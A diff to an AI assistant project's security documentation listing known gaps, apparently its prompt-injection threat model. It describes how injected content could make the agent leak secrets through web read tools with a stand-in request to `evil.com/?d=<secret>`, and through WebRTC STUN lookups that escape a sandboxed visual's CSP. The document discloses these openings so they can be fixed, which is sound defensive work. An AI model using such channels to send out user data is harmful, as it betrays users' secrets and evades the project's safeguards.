@@ -231,7 +231,7 @@ role. Background turns can no longer act (item 5), and door-opening Home Assista
 for a yes (item 2). What remains is the **live user turn**: there, the web read tools are an
 **exfiltration** channel (`evil.com/?d=<secret>`, the outbound *request itself* is the leak,
 which no ingestion filter stops), and other Home Assistant control (lights, climate, locking)
-still acts directly. This is the capability-mask work in the TODO — see
+still acts directly. A per-session tool-capability mask would close it; see
 [Known Gaps](#known-gaps).
 
 ---
@@ -413,8 +413,12 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    a turn the user started,
    the web read tools (`search`, `url`) can still carry data out: the outbound *request* to
    `evil.com/?d=<secret>` is the leak, so the ingestion filter that scans fetched *content* does
-   not help. A per-session capability mask ("propose, don't act" after reading untrusted
-   content) is the fix. *(TODO: "Capability mask Phase 2.")*
+   not help. A per-session tool-capability mask ("propose, don't act" after reading untrusted
+   content) would close it; it is not built yet.
+   A rendered visual (`render_visual`) is the same channel from the browser: its script runs in
+   a sandboxed iframe that can't open connections (`connect-src 'none'`), load from other hosts,
+   submit forms or navigate, but WebRTC isn't covered by any CSP directive, so a visual can
+   still name an attacker's STUN host (a DNS lookup and a UDP packet) with data in it.
 
 2. **SSRF on the native web-fetch path — CLOSED for `url_fetch`/`search` (2026-08, deep-research
    branch); FlareSolverr residual remains.** The native curl path now installs a
@@ -470,7 +474,7 @@ Open, acknowledged, and contributor help is welcome. Each maps to a tracked TODO
    reinforced — so no cross-user reach and no fact creation), and each bump is rate-limited to
    once per fact per hour, clamped (≤0.5), and ceilinged at 1.0. The durable fix is to withhold
    reinforcement on turns that ran an outward-reading tool, which composes with gap #1's
-   capability mask. *(TODO: "Capability mask Phase 2" / `CAPABILITY_MASK_DESIGN.md`.)*
+   per-session tool-capability mask (not built yet).
 
 10. **Schwab enrollment is operator-trust (SO_PEERCRED), not admin-password-gated.** The
    `dawn-admin schwab auth`/`status` opcodes (`0xE3-0xE5`) sit in the same peer-cred operator
